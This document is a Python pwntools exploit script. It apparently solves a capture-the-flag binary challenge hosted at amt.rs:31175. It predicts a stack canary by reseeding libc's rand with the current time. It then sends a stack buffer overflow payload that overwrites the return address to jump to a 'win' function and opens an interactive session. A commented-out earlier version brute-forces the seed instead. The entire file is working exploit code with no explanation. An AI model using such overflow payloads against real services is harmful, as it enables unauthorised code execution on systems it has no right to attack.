# from pwn import *
# from ctypes import CDLL
# from ctypes.util import find_library

# file = ELF("../chal/chal")
# libc = CDLL(find_library("c"))

# HOST = amt.rs
# POST = 31175

# if args.HOST and args.PORT:
#     p = remote(args.HOST, args.PORT)
# else:
#     p = process("../chal/chal", cwd="../chal")

# time = libc.time(0)

# # generate 10 numbers to compare
# numbers = []
# for i in range(10):
#     p.sendlineafter(b"Exit\n", b"1")
#     numbers.append(int(p.readline()))

# # guess the random seed and get the canary
# for i in range(time-4096, time+4096):
#     libc.srand(i)
#     canary = libc.rand()
#     tmp = []
#     for _ in range(10):
#         tmp.append(libc.rand())
#     guess = libc.rand()
#     if tmp == numbers:
#         break

# print(f"[+] canary: {canary:x}")

# attack = str(guess).encode().ljust(0x2c, b"\x00")
# attack += p32(canary)
# attack += p64(0)
# attack += p64(file.symbols["win"])
# p.sendline(b"2")
# p.sendline(attack)

# p.interactive()

from pwn import *
from time import time
from ctypes import CDLL
from ctypes.util import find_library

libc = CDLL(find_library("c"))

# p = process(["./rntk"])
p = remote("amt.rs", 31175)
# gdb.attach(p, "break *0x401384\nc")

libc.srand(int(time())+1)
print(libc.rand())
libc.srand(int(time()))
randed = (libc.rand())
print(randed)
libc.srand(int(time())-1)
print(libc.rand())

p.sendline(b"2")
p.sendline(cyclic(44) + p32(randed) + b"\x00\x00\x00\x00\x00\x00\x00\x00" + p32(0x4012b6))

p.interactive()